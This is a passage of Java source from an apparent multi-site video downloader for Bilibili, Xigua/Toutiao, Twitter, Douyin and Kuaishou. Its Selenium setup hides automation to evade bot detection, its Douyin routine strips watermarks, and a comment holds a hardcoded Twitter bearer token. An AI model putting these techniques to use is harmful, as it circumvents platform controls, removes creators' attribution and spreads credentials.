				// 把下载的 mp4 文件 名称 转为 md值
				url_name_LogList.add(videoUrl + "          " + mdName);
				urlStrList.add(videoUrl);

			} else {

				System.out.println("当前 BliBli视频(声音和视频是两个单独文件)  把x_video.mp4 和 x_audio.mp4 文件合成失败 请手动合并 命令如下:");

				System.out.println("合并视频【" + videoFile.getAbsolutePath() + " 】  声音【" + audioFile.getAbsolutePath() + "】"
						+ " 命令如下:");
				System.out.println("________________________________________________");
				System.out.println(" ffmpeg -i " + videoFile.getAbsolutePath() + " -i " + audioFile.getAbsolutePath()
						+ " -c:v copy -c:a aac -strict experimental  " + fileAddress_notype_str + ".mp4");
				System.out.println("________________________________________________");
			}
		}

		public File mergeBliBli_Video_Audio_Files(File videoFile, File audioFile, BliBliVideoInfo mBliBli_VIDEO_INFO,
												  String outputFilePath) {
			File outPutFile = null;
			System.out.println("--------------开始合并音视频--------------");
			String outFilePath = outputFilePath;

			List<String> commend = new ArrayList<>();

			String ffmpeg_path = getEnvironmentExePath("ffmpeg");
			if (ffmpeg_path == null) {
				errorMsg = "当前 ffmpeg 不在环境变量中 请下载该库 并添加到 环境变量中  下载的视频文件和音频文件需要合并才能正常 否则 mp4 文件无声音!!";
				System.out.println(errorMsg);
				return null;
			}
			commend.add(ffmpeg_path);
			commend.add("-i");
			commend.add(videoFile.getAbsolutePath());
			commend.add("-i");
			commend.add(audioFile.getAbsolutePath());
			commend.add("-vcodec");
			commend.add("copy");
			commend.add("-acodec");
			commend.add("copy");
			commend.add(outFilePath);

			ProcessBuilder builder = new ProcessBuilder();
			builder.command(commend);
			try {
				builder.inheritIO().start().waitFor();
				System.out.println("--------------音视频合并完成--------------");
			} catch (InterruptedException | IOException e) {
				System.err.println("音视频合并失败！");
				e.printStackTrace();
			}

			outPutFile = new File(outFilePath);

			return outPutFile;

		}

		void XiGua_TouTiao_ParseUrl(int index, String url) {
			// String
			// url="https://m.toutiaoimg.cn/group/6966235416110301696/?app=news_article_lite&timestamp=1626072237&group_id=6966235416110301696&share_token=0f88ebb4-c474-4671-9d9b-4b7e76004e38";

			org.jsoup.nodes.Document mainHtml;
			String jiemi_base64_url = null;
			String base64_jiami_url = null;
			String NoMainUrl_VideoTag_url = null; // 对于 没有 main_url 但 有 <video src="http" //这样的页面的处理

			// backup_url_1 有时 main_url 会 解析错误 所以 会导致 下载不了视频 此时 需要用 备用视频下载
			String jiemi_base64_bankurl = null;
			String base64_jiami_bankurl = null;

			String main_url_keyword = "\"main_url\":\"";
			String bankup_url_keyword = "\"backup_url_1\":\"";

			try {
				mainHtml = Jsoup.parse(getXiGua_BliBli_MainPageSource(url));

				if (mainHtml != null && mainHtml.toString().contains("mediatype=\"video\"")
						&& mainHtml.toString().contains("src=\"http") && mainHtml.toString().contains("<video")) {
					String mainHtmlStr = mainHtml.toString();
					// <video class="" tabindex="2" mediatype="video"
					// src="http://v3-default.ixigua.com/c
					String begin_video_tag = mainHtmlStr.substring(mainHtmlStr.indexOf("<video"));
					String src_begin_tag = begin_video_tag.substring(begin_video_tag.indexOf("src=\"http"));
					String http_begin_tag = src_begin_tag.replace("src=\"http", "");
					String target_video_url = "http" + http_begin_tag.substring(0, http_begin_tag.indexOf("\""));
					NoMainUrl_VideoTag_url = target_video_url;
					System.out.println("当前页面源码有 Video Tag 标签 ");

					System.out.println();
					System.out.println("url = " + url);
					System.out.println("NoMainUrl_VideoTag_url = " + NoMainUrl_VideoTag_url);
					System.out.println("===============mainHtml Begin============ ");

					System.out.println(mainHtml);

					System.out.println("===============mainHtml Endxx============ ");

					System.out.println();

				} else {
					System.out.println();
					System.out.println("url = " + url);
					System.out.println("===============mainHtml Begin============ ");

					System.out.println(mainHtml);

					System.out.println("===============mainHtml Endxx============ ");

					System.out.println();
				}
				if (mainHtml != null) {
					String MainHtmlStr = mainHtml.toString();

					// 把 "main_url":" 去除 那么 起点 就是 我们 要找的 url
					// "backup_url_1":"

					base64_jiami_url = calculXiGuaMainUri(url, MainHtmlStr, main_url_keyword);
					base64_jiami_bankurl = calculXiGuaMainUri(url, MainHtmlStr, bankup_url_keyword);
					if (base64_jiami_url == null) {

						if (NoMainUrl_VideoTag_url != null) {
							System.out.println(
									"解析出的 base64_jiami_main_url 为空  但存在 video_tag_url = " + NoMainUrl_VideoTag_url);
							System.out.println(" 尝试下载  video_tag_url : " + NoMainUrl_VideoTag_url);

							downRawVideo_WithUrl(url, NoMainUrl_VideoTag_url, "", "TouTiao");
						} else {

							System.out.println(
									"解析出的 base64_jiami_main_url 为空  NoMainUrl_VideoTag_url 为空 无法下载视频到本地   base64_jiami_url="
											+ base64_jiami_url);

						}

					} else {
						System.out.println("解析出的 base64_jiami_url=[" + base64_jiami_url + "]  尝试解密base64");



// 当前寻找到的 base64_url =
// aHR0cDovL3YzLXhnLXdlYi1wYy5peGlndWEuY29tLzc4ZGUwNTEzOTI4MWE4NjAwNGI4NDA0Njc5ZGI4ZWRmLzYzMzEyMDJmL3ZpZGVvL3Rvcy9jbi90b3MtY24tdmUtNC8wNmEyMGNhZGZmN2I0YzE4YmU2NmIwMmU2Y2RiM2M2Yi8
// \u002FYT0xNzY4JmNoPTAmY3I9MCZkcj0wJmVyPTAmY2Q9MCU3QzAlN0MwJTdDMCZjdj0xJmJyPTMwMDQmYnQ9MzAwNCZjcz0wJmRzPTQmZnQ9ZUluSjcyMkhqd2s5S3lCTXlxc1ExLUM1cVNZSGF+UHVEdEc3WHZsVlJxOCZtaW1lX3R5cGU9dmlkZW9fbXA0JnFzPTAmcmM9TlRnMk9EcGtPenRrTkdZOE9HYzRNMEJwTTNrNU5XcDFjSE40TlRNek5EY3pNMEJlWUdNME1qTmZOalF4TW1Jd05HTTFZU05tWDJCalkyTTBhREpnTFMxa0xTOXpjdyUzRCUzRCZsPTIwMjIwOTI2MTA0MDUxMDEwMjEyMTM4MDUxMDQyNjhEMTY=
// 需要 判断 当前的 解析的 url 是否 包含 u001  u002   如果包含  那么  需要 截取


						if(base64_jiami_url.contains("\\u002")) {
							System.out.println("当前 base-url 包含 \\u002 间隔字符");

							base64_jiami_url = base64_jiami_url.substring(0,base64_jiami_url.indexOf("\\u002"));

						}

						if(base64_jiami_url.contains("\\u001")) {
							System.out.println("当前 base-url 包含 \\u001 间隔字符");

							base64_jiami_url = base64_jiami_url.substring(0,base64_jiami_url.indexOf("\\u001"));

						}
						System.out.println(" base64_jiami_url=[" + base64_jiami_url + "]  开始尝试解密base64");

						jiemi_base64_url = jiemi_decryptBASE64(base64_jiami_url);
						System.out.println();

						System.out.println("解析出的地址  jiemi_base64_url = [" + jiemi_base64_url + "]");

						if (jiemi_base64_url.startsWith("http")) {
							System.out.println("执行 main_url 下载操作!!!    jiemi_base64_url=[" + jiemi_base64_url + "]");
							downRawVideo_WithUrl(url, jiemi_base64_url, "", "TouTiao");

						} else {
							System.out.println("解密出的地址不是以  http 开头  无法下载!!!");
						}

					}

				} else {
					System.out.println(
							"当前读取到的 网页源码为空 ,   可能 G2_chromedriver版本 和 当前浏览器版本不一致!!   \n chromedriver.exe 下载地址: http://npm.taobao.org/mirrors/chromedriver/");
				}

			} catch (Exception e) {
				// TODO: handle exception
				System.out.println("解密Base64出意外Exception 尝试使用 bankup_url   \njiemi_base64_url=[" + jiemi_base64_url
						+ "]\nbase64_jiami_url=[" + base64_jiami_url + "]    \n base64_jiami_bankurl=["
						+ base64_jiami_bankurl + "]");

				try {
					if (base64_jiami_bankurl != null) {

						jiemi_base64_bankurl = jiemi_decryptBASE64(base64_jiami_bankurl);
					}

					if (jiemi_base64_bankurl != null && jiemi_base64_bankurl.startsWith("http")) {
						System.out.println(
								"执行 bankup_url_1 下载操作!!!    jiemi_base64_bankurl=[" + jiemi_base64_bankurl + "]");
						downRawVideo_WithUrl(url, jiemi_base64_bankurl, "", "TouTiao");

					}

				} catch (Exception e1) {

					System.out.println("尼玛 不干了  备用的 bankup_url 也解析失败!! 下载失败!! jiemi_base64_bankurl =["
							+ jiemi_base64_bankurl + "]");
					// TODO: handle exception
				}

			}

		}

		// 把 "main_url":" 去除 那么 起点 就是 我们 要找的 url
		// "backup_url_1":"

		public String calculXiGuaMainUri(String url, String mainHtmlStr, String beginKeyStr) {

			String jiami_main_uri = null;

			if (mainHtmlStr == null) {
				System.out.println("当前 url=" + url + "  获取到的网页源代码 htmlcode 为空!! ");
				return jiami_main_uri;
			}

			if (!mainHtmlStr.contains("\"vtype\":\"mp4\"")) {
				System.out.println("当前 url=" + url + "  获取到的网页源代码 htmlcode   不包含关键字 \"vtype\":\"mp4\" 无法解析视频!! ");
				return jiami_main_uri;
			}

			// "definition":"1080p","quality":"normal","vtype":"mp4"
			// "definition":"720p","quality":"normal","vtype":"mp4"
			// "definition":"480p","quality":"normal","vtype":"mp4"
			// "definition":"360p","quality":"normal","vtype":"mp4"

			String mp4_1080p_keystr = "\"definition\":\"1080p\",\"quality\":\"normal\",\"vtype\":\"mp4\"";
			String mp4_720p_keystr = "\"definition\":\"720p\",\"quality\":\"normal\",\"vtype\":\"mp4\"";
			String mp4_480p_keystr = "\"definition\":\"480p\",\"quality\":\"normal\",\"vtype\":\"mp4\"";
			String mp4_360p_keystr = "\"definition\":\"360p\",\"quality\":\"normal\",\"vtype\":\"mp4\"";

			String mKeyMp4Tag = null; // 如果有 1080p 那么选择1080p 如果只有720p 那么就是720p 选分辨率最高那个

			if (mainHtmlStr.contains(mp4_1080p_keystr)) {
				mKeyMp4Tag = mp4_1080p_keystr;
			} else if (mainHtmlStr.contains(mp4_720p_keystr)) {
				mKeyMp4Tag = mp4_720p_keystr;
			} else if (mainHtmlStr.contains(mp4_480p_keystr)) {
				mKeyMp4Tag = mp4_480p_keystr;
			} else if (mainHtmlStr.contains(mp4_360p_keystr)) {
				mKeyMp4Tag = mp4_360p_keystr;
			}

			if (mKeyMp4Tag == null) {

				System.out.println(
						"当前 url=" + url + "  获取到的网页源代码 htmlcode  查不到 1080p 720p 480p  360p 视频的任意一个  无法解析视频!! ");

				return jiami_main_uri;
			}

			// 把 要 解析的 分辨率 搞到 第一行位置
			// "definition":"1080p","quality":"normal","vtype":"mp4","vwidth":1920,"vheight":1080,"bitrate":2629630,"fps":25,"codec_type":"h264","size":77367333,"main_url":"...,"backup_url_1":...
			String mp4tag_begin_str = mainHtmlStr.substring(mainHtmlStr.indexOf(mKeyMp4Tag));

			if (mp4tag_begin_str == null || !mp4tag_begin_str.contains("\"main_url\":\"")) {
				System.out.println("当前 url=" + url + "  获取到的网页源代码 htmlcode  找到 1080p 720p 480p  360p   mKeyMp4Tag = "
						+ mKeyMp4Tag + "  但解析出 main_url 失败!!");

				return jiami_main_uri;
			}

			if (mp4tag_begin_str == null || !mp4tag_begin_str.contains("\"backup_url_1\":\"")) {
				System.out.println("当前 url=" + url + "  获取到的网页源代码 htmlcode  找到 1080p 720p 480p  360p   mKeyMp4Tag = "
						+ mKeyMp4Tag + "  但解析出  backup_url_1;	 失败!!");

				System.out.println();
				System.out.println();
				System.out.println("mp4tag_begin_str = ");
				System.out.println(mp4tag_begin_str);

				System.out.println();
				System.out.println();

			}

			// "main_url":"...,"backup_url_1":...
			String main_url_begin = mp4tag_begin_str.substring(mp4tag_begin_str.indexOf(beginKeyStr));

			// 把 "main_url":" 去除 那么 起点 就是 我们 要找的 url
			// "backup_url_1":"
			String main_url_raw = main_url_begin.replace(beginKeyStr, "");

			// 第一个引号的位置 就是 结束 标示 main_url_fixed 就是我们 要找的 url_raw
			String main_url_fixed = main_url_raw.substring(0, main_url_raw.indexOf("\""));

			System.out.println("当前寻找到的 base64_url = " + main_url_fixed);

			return main_url_fixed;

		}

		/**
		 * 获取首页内容
		 *
		 * @return 首页内容
		 * @throws InterruptedException 睡眠中断异常
		 */
		String getXiGua_BliBli_MainPageSource(String url) {

			ChromeOptions CUR_CHROME_OPTIONS = new ChromeOptions();
			// 驱动位置
			CUR_CHROME_OPTIONS.addArguments("--start-fullscreen");

//				CUR_CHROME_OPTIONS.addArguments("Accept=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
//				CUR_CHROME_OPTIONS.addArguments("Accept-Encoding=gzip, deflate, sdch");
//				CUR_CHROME_OPTIONS.addArguments("Accept-Language=zh-CN,zh;q=0.8");
//				CUR_CHROME_OPTIONS.addArguments("Connection=keep-alive");
//				CUR_CHROME_OPTIONS.addArguments("Host=activityunion-marketing.meituan.com");
//				CUR_CHROME_OPTIONS.addArguments("Upgrade-Insecure-Requests=1");
//				CUR_CHROME_OPTIONS.addArguments("User-Agent=Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4");

			System.setProperty("webdriver.chrome.driver", ChromeDriverFile.getAbsolutePath());
			// 避免被浏览器检测识别
			CUR_CHROME_OPTIONS.setExperimentalOption("excludeSwitches", Collections.singletonList("enable-automation"));

			ChromeDriver driver = new ChromeDriver(CUR_CHROME_OPTIONS);
			int loop_index = 0;
			try {

				driver.get(url);
				long waitTime = Double.valueOf(Math.max(3, Math.random() * 5) * 1000).longValue();
				TimeUnit.MILLISECONDS.sleep(waitTime);
				long timeout = 20_000;
				// 循环下拉，直到全部加载完成或者超时
				do {
					new Actions(driver).sendKeys(Keys.END).perform();
					TimeUnit.MILLISECONDS.sleep(waitTime);
					if (loop_index == 1) {
						System.out.println("!! 触发点击事件  起始 标识 AAA !!");
						new Actions(driver).sendKeys(Keys.HOME).perform();
						TimeUnit.MILLISECONDS.sleep(1500);
						try {
							driver.findElement(By.className("xgplayer-start")).click();
							TimeUnit.MILLISECONDS.sleep(2000);
						} catch (Exception e) {
							System.out.println("尝试点击播放按钮失败!! ");

							System.out.println("click异常:");
							System.out.println(e.fillInStackTrace());

						}

					}

					TimeUnit.MILLISECONDS.sleep(waitTime);
					timeout -= waitTime;
					loop_index++;
				} while (!driver.getPageSource().contains("已经到底部，没有新的内容啦") && timeout > 0);
				System.out.println("已经到底部，没有新的内容啦");
				return driver.getPageSource();
			} catch (Exception e) {
				// TODO: handle exception
				System.out.println("获取网页源码的时候出错  url = " + url);
				e.printStackTrace();

			} finally {
				driver.close();

			}
			return null;
		}

		public String getPostDataString(HashMap<String, String> params) throws UnsupportedEncodingException {
			StringBuilder result = new StringBuilder();
			boolean first = true;
			for (Map.Entry<String, String> entry : params.entrySet()) {
				if (first)
					first = false;
				else
					result.append("&");
				result.append(URLEncoder.encode(entry.getKey(), "UTF-8"));
				result.append("=");
				result.append(URLEncoder.encode(entry.getValue(), "UTF-8"));
			}
			return result.toString();
		}

		public List<TwitterVideo> extractTwitterVideo(String id) {
			/*
			 * URL url = new
			 * URL(String.format("https://api.twitter.com/1.1/videos/tweet/config/%s.json",
			 * id)); HttpURLConnection connection = (HttpURLConnection)
			 * url.openConnection(); connection.setRequestMethod("GET");
			 * connection.addRequestProperty("Authorization",
			 * "Bearer AAAAAAAAAAAAAAAAAAAAAIK1zgAAAAAA2tUWuhGZ2JceoId5GwYWU5GspY4%3DUq7gzFoCZs1QfwGoVdvSac3IniczZEYXIcDyumCauIXpcAPorE"
			 * ); connection.setRequestProperty("User-Agent",
			 * "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.56 Mobile Safari/537.36"
			 * );
			 */

			List<TwitterVideo> curTwitterListInfo = null;

			try {

				InetSocketAddress address = new InetSocketAddress("127.0.0.1", 7078);
				Proxy proxy = new Proxy(Proxy.Type.HTTP, address); // http代理协议类型

				URL url = new URL("https://twittervideodownloaderpro.com/twittervideodownloadv2/index.php");
//				HttpURLConnection connection = (HttpURLConnection) url.openConnection(proxy);   // 代理  有点慢
				HttpURLConnection connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("POST");
				connection.setRequestProperty("User-Agent",
						"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.56 Mobile Safari/537.36");

				connection.setDoOutput(true);
				connection.setDoInput(true);

				HashMap<String, String> postDataParams = new HashMap<>();
				postDataParams.put("id", id);
				long beginTimeStamp = System.currentTimeMillis();
				System.out.println("connection.getOutputStream  Begin  获取 id=" + id + "  对应的  ( TwitterInfo_耗时A 得很)");

				OutputStream os = connection.getOutputStream();
				long endTimeStamp = System.currentTimeMillis();
				long distance_second = (endTimeStamp - beginTimeStamp) / 1000;
				System.out.println("connection.getOutputStream  Begin  获取 id=" + id + "  成功 TwitterInfo_耗时A :【"
						+ distance_second + "秒】");

				System.out.println("connection.getOutputStream  End ");

				BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
				System.out.println("getPostDataString Begin ");
				writer.write(getPostDataString(postDataParams));
				System.out.println("getPostDataString  End ");
				writer.flush();
				writer.close();
				os.close();
				System.out.println("Debug: extractTwitterVideo  Begin  statusCode (耗时B)");
				System.out.println("connection.getOutputStream  Begin  获取 id=" + id + "  对应的  ( TwitterInfo_耗时B  _得很)");
				beginTimeStamp = System.currentTimeMillis();
				int statusCode = connection.getResponseCode();
				endTimeStamp = System.currentTimeMillis();
				distance_second = (endTimeStamp - beginTimeStamp) / 1000;

				System.out.println("Debug: extractTwitterVideo  End  statusCode = " + statusCode + "  TwitterInfo_耗时B 【"
						+ distance_second + " 秒】");

				if (statusCode == 200) {
					StringBuilder sb = new StringBuilder();
					InputStream in;
					String contentEncoding = connection.getHeaderField("Content-Encoding");
					if (contentEncoding != null && contentEncoding.equals("gzip")) {
						in = new GZIPInputStream(connection.getInputStream());
					} else {
						in = connection.getInputStream();
					}
					BufferedReader reader = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));
					String line;
					while ((line = reader.readLine()) != null) {
						sb.append(line).append("\r\n");
					}
					reader.close();
					org.json.JSONObject object = new org.json.JSONObject(sb.toString());
					if (object.has("state") && object.getString("state").equals("success")) {
						if (object.has("videos")) {
							JSONArray videos = object.getJSONArray("videos");
							List<TwitterVideo> twitterVideos = new ArrayList<>();
							for (int i = 0; i < videos.length(); i++) {
								org.json.JSONObject video = videos.getJSONObject(i);
								TwitterVideo twitterVideo = new TwitterVideo();
								if (video.has("duration")) {
									twitterVideo.duration = video.getLong("duration");
								}
								if (video.has("size")) {
									twitterVideo.size = video.getLong("size");
								}
								if (video.has("url")) {
									twitterVideo.url = video.getString("url");
								}
								twitterVideos.add(twitterVideo);
							}
							System.out.println("依据 PageUrl 获取 到  ID 成功！！ ");
							download_failed_time = 0;
							return twitterVideos;
						}
					}
				}

			} catch (Exception e) {
				download_failed_time++;
				if (download_failed_time % 5 == 0) {
					System.out.println("解析 pageUrl【" + id + "】 Retry 5 次 都失败!!  放弃这个 ID对应的资源!! ");

				} else {
					curTwitterListInfo = extractTwitterVideo(id);

					if (curTwitterListInfo != null && curTwitterListInfo.size() > 0) {
						download_failed_time = 0;
						return curTwitterListInfo;
					}

				}

			}

			return null;
		}

		public void TW_Download(int index, String httppage) {

			// 1. 获取 tw 的 id
			System.out.println("TW_Download  Method Begin ");
			String id_str = getIdFromTWUrl(httppage);

			System.out.println("TW_Download  Method    id_str =" + id_str);

			if (id_str == null || "".equals(id_str.trim()) || !isNumeric(id_str.trim())) {
				System.out.println("当前 TW-Url: " + httppage + " 识别出的ID出错请检查!! id_str=" + id_str);
				return;
			}

			try {

				System.out.println("extractTwitterVideo  Method Begin ");
				List<TwitterVideo> list = extractTwitterVideo(id_str);
				System.out.println("extractTwitterVideo  Method End ");
				if (list == null || list.size() == 0) {
					System.out.println("返回为空 ");
				} else {

					System.out.println("返回 list.size() == " + list.size());
					TwitterVideo high_url_TwitterVideo = showTwitterInfo_ReturnBigOne(list);

					if (high_url_TwitterVideo != null) {
						downRawVideo_WithUrl_Proxy(httppage, high_url_TwitterVideo.url, id_str, null);
						// downloadByCommonIO(httppage, high_url_TwitterVideo.url, id_str, null);
						System.out.println("下载操作完成!");

					} else {
						System.out.println(" url 为空 无法执行下载操作!! ");
					}
				}

			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				System.out.println("出现异常!! ");
			}

		}

		TwitterVideo showTwitterInfo_ReturnBigOne(List<TwitterVideo> list) {
			TwitterVideo curBigItem = null;
			long currentBigSize = 0l;
			for (int i = 0; i < list.size(); i++) {
				TwitterVideo item = list.get(i);

				if (currentBigSize < item.size) {
					currentBigSize = item.size;
					curBigItem = item;
				}
				System.out.println("twitter[" + i + "]:" + item.toString());
			}
			if (curBigItem != null) {
				System.out.println("最大分辨率-url:" + curBigItem.toString() + "");
			} else {
				System.out.println("没有选中最大分辨率的 url!!  请检查");
			}

			return curBigItem;
		}

		String getIdFromTWUrl(String httpPageUrl) {
			// // https://twitter.com/PDChinese/status/1427649465826033672?s=19

			String status_end = httpPageUrl.substring(httpPageUrl.indexOf("status/") + "status/".length());

			String clear_doubt_id = status_end.substring(0, status_end.indexOf("?"));

			return clear_doubt_id;

		}

		/**
		 * 方法描述: 抖音解析下载视频
		 *
		 */
		@SuppressWarnings("unchecked")
		public void douYinParseUrl(String url) {
			try {
				final String videoPath = "https://www.iesdouyin.com/web/api/v2/aweme/iteminfo/?item_ids=";
				Connection con = Jsoup.connect(clearChinese(url));
				con.header("User-Agent",
						"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 Version/12.0 Safari/604.1");
				Connection.Response resp = con.method(Connection.Method.GET).execute();
				String videoUrl = videoPath + getItemId(resp.url().toString());
				String jsonStr = Jsoup.connect(videoUrl).ignoreContentType(true).execute().body();
				JSONObject json = JSONObject.parseObject(jsonStr);
				String videoAddress = json.getJSONArray("item_list").getJSONObject(0).getJSONObject("video")
						.getJSONObject("play_addr").getJSONArray("url_list").get(0).toString();
				String title = json.getJSONArray("item_list").getJSONObject(0).getJSONObject("share_info")
						.getString("share_title");
				videoAddress = videoAddress.replaceAll("playwm", "play");
				HashMap headers = MapUtil.newHashMap();
				headers.put("User-Agent",
						"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 Version/12.0 Safari/604.1");
				String finalVideoAddress = HttpUtil.createGet(videoAddress).addHeaders(headers).execute()
						.header("Location");
				// 注:打印获取的链接
				System.out.println(
						"-----抖音去水印链接-----\n" + "finalVideoAddress【" + finalVideoAddress + "】 " + " \nvideoAddress【"
								+ videoAddress + "】   \nvideoUrl【" + videoUrl + "】" + "   \njsonStr【" + jsonStr + "】");
				// 下载无水印视频到本地
				if (finalVideoAddress == null) {
					// 如果 finalVideoAddress 为 null 那么尝试 使用 videoAddress下载
					finalVideoAddress = videoAddress;
				}
				downRawVideo_WithUrl(url, finalVideoAddress, title, "douyin");
			} catch (IOException e) {
				System.out.println(e.getMessage());
			}
		}

		@SuppressWarnings("unchecked")
		public void ksParseUrl(String url) {
			HashMap headers = MapUtil.newHashMap();
			headers.put("User-Agent",
					"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Mobile Safari/537.36");
			String redirectUrl = HttpUtil.createGet(url).addHeaders(headers).execute().header("Location");
			String body = HttpUtil.createGet(redirectUrl).addHeaders(headers).execute().body();
			Document doc = Jsoup.parse(body);
			Elements videoElement = doc.select("video[id=video-player]");
			String videoUrl = videoElement.get(0).attr("src");
			String title = videoElement.get(0).attr("alt");
			System.out.println();
			System.out.println(videoUrl);
			System.out.println(title);
			downRawVideo_WithUrl(url, videoUrl, title, "kuaishou");
		}

		public void downloadByCommonIO(String pageUrl, String httpUrl, String fileNameNoPoint, String source) {
//			int index_download = 1;
//			String timeStamp_Str  = getTimeStamp();
//			String videoSavePath = ztemp_dir;

			// String fileAddress = videoSavePath+"/"+source+"/"+title+".mp4";
			String fileAddress = videoSavePath + "/"
					+ ((source == null || "".equals(source) ? "" : source + "_") + fileNameNoPoint.replace(" ", ""))
					+ "_" + index_download + "_" + timeStamp_Str + ".mp4";
			fileAddress = clearChinese(fileAddress);
			fileAddress = fileAddress.replace(" ", "");
			fileAddress = fileAddress.replace("	", "");
			fileAddress = fileAddress.replace("！", "");
			fileAddress = fileAddress.replace("!", "");
			fileAddress = fileAddress.replace("，", "");
			fileAddress = fileAddress.replace("：", "");
			fileAddress = fileAddress.replace("《", "");
			fileAddress = fileAddress.replace("？", "");
			fileAddress = fileAddress.replace("。", "");

			try {
				System.out.println();
				System.out.println(
						"downloadByCommonIO_Retry下载[" + download_failed_time + "] Begin fileAddress= " + fileAddress);
				System.out
						.println("downloadByCommonIO_Retry下载[" + download_failed_time + "] Begin HttpUrl= " + httpUrl);
				System.out
						.println("downloadByCommonIO_Retry下载[" + download_failed_time + "] Begin PageUrl= " + pageUrl);

				File fileSavePath = new File(fileAddress);
				FileUtils.copyURLToFile(new URL(httpUrl), fileSavePath, 30000, 30000);
				download_failed_time = 0;
				System.out
						.println("downloadByCommonIO_下载[" + download_failed_time + "] End  fileAddress=" + fileAddress);

				System.out.println("\n-----视频保存路径-----\n" + fileSavePath.getAbsolutePath());
				System.out.println("\nzzfile_3.bat " + fileSavePath.getParentFile().getAbsolutePath());

				// 获取文件的 md值 并重命名为 mdxxxx.mp4
				String mdName = getMD5Three(fileSavePath.getAbsolutePath());
				String new_Md_Name = mdName + ".mp4";
				tryReName(fileSavePath, new_Md_Name);
				System.out.println("\n-----视频保存路径(MD名称)-----\n" + fileSavePath.getAbsolutePath());
				// 把下载的 mp4 文件 名称 转为 md值
				url_name_LogList.add(pageUrl + "          " + mdName);
				urlStrList.add(httpUrl);

			} catch (IOException e) {
				download_failed_time++;
				if (download_failed_time % 10 == 0) {
					System.out.println("程序下载 retry " + download_failed_time + " 次 仍然 下载 失败----放弃");
				} else {
					downloadByCommonIO(pageUrl, httpUrl, fileNameNoPoint, source);
				}
				// e.printStackTrace();
			}

		}

		// 视频的保存 目录 不能是 当前文件 否则 就会执行 同步操作 影响网速
		// pageUrl 是页面的url httpUrl 是视频文件的url
		@SuppressWarnings("unchecked")
		public void downRawVideo_WithUrl_Proxy(String pageUrl, String httpUrl, String fileNameNoPoint, String source) {
			if (urlStrList.contains(httpUrl)) {
				System.out.println("当前url 路径已经下载过  跳过下载!!  url路径: " + httpUrl + "");
				return;
			}

			// String fileAddress = videoSavePath+"/"+source+"/"+title+".mp4";
			String fileAddress = videoSavePath + "/"
					+ ((source == null || "".equals(source) ? "" : source + "_") + fileNameNoPoint.replace(" ", ""))
					+ "_" + index_download + "_" + timeStamp_Str + ".mp4";
			fileAddress = clearChinese(fileAddress);
			fileAddress = fileAddress.replace(" ", "");
			fileAddress = fileAddress.replace("	", "");
			fileAddress = fileAddress.replace("！", "");
			fileAddress = fileAddress.replace("!", "");
			fileAddress = fileAddress.replace("，", "");
			fileAddress = fileAddress.replace("：", "");
			fileAddress = fileAddress.replace("《", "");
			fileAddress = fileAddress.replace("？", "");
			fileAddress = fileAddress.replace("。", "");
			int byteRead;

			try {

				// 获取链接

				System.out.println(
						"downloadByCommonIO_Retry下载[" + download_failed_time + "] Begin fileAddress= " + fileAddress);
				System.out
						.println("downloadByCommonIO_Retry下载[" + download_failed_time + "] Begin HttpUrl= " + httpUrl);
				System.out
						.println("downloadByCommonIO_Retry下载[" + download_failed_time + "] Begin PageUrl= " + pageUrl);

				InetSocketAddress address = new InetSocketAddress("127.0.0.1", 7078);
				Proxy proxy = new Proxy(Proxy.Type.HTTP, address); // http代理协议类型
				URL url = new URL(httpUrl);
				URLConnection conn = url.openConnection(proxy); // 代理
//				URLConnection conn = url.openConnection();
				// 输入流
				long beginTimeStamp = System.currentTimeMillis();
				System.out.println("conn.getInputStream 获得 输入流  Begin ( downRawVideo耗时_A 得很) ");
				InputStream inStream = conn.getInputStream();
				long endTimeStamp = System.currentTimeMillis();
				long distance_second = (endTimeStamp - beginTimeStamp) / 1000;

				System.out.println("conn.getInputStream 获得 输入流  End ( downRawVideo耗时_A【" + distance_second + " 秒】 得很)");

				// 封装一个保存文件的路径对象
				File fileSavePath = new File(fileAddress);
				// 注:如果保存文件夹不存在,那么则创建该文件夹
				File fileParent = fileSavePath.getParentFile();
				if (!fileParent.exists()) {
					fileParent.mkdirs();
				}
				// 写入文件
				FileOutputStream fs = new FileOutputStream(fileSavePath);
				byte[] buffer = new byte[1024];
				beginTimeStamp = System.currentTimeMillis();
				System.out.println("FileOutputStream.write  写入本地文件  Begin   比较 downRawVideo_耗时_B ");
				while ((byteRead = inStream.read(buffer)) != -1) {
					fs.write(buffer, 0, byteRead);
				}
				endTimeStamp = System.currentTimeMillis();
				distance_second = (endTimeStamp - beginTimeStamp) / 1000;

				System.out.println(
						"FileOutputStream.write  写入本地文件  End ( downRawVideo_耗时_B【" + distance_second + " 秒】 得很)");

				inStream.close();
				fs.close();
				System.out.println("\n-----视频保存路径-----\n" + fileSavePath.getAbsolutePath());
				System.out.println("\nzzfile_3.bat " + fileSavePath.getParentFile().getAbsolutePath());

				// 获取文件的 md值 并重命名为 mdxxxx.mp4
				String mdName = getMD5Three(fileSavePath.getAbsolutePath());
				String new_Md_Name = mdName + ".mp4";
				tryReName(fileSavePath, new_Md_Name);
				// 把下载的 mp4 文件 名称 转为 md值
				url_name_LogList.add(pageUrl + "          " + mdName);
				urlStrList.add(httpUrl);
				download_failed_time = 0;
				System.out
						.println("downloadByCommonIO_下载[" + download_failed_time + "] End  fileAddress=" + fileAddress);
			} catch (Exception e) {

				download_failed_time++;
				if (download_failed_time % 10 == 0) {
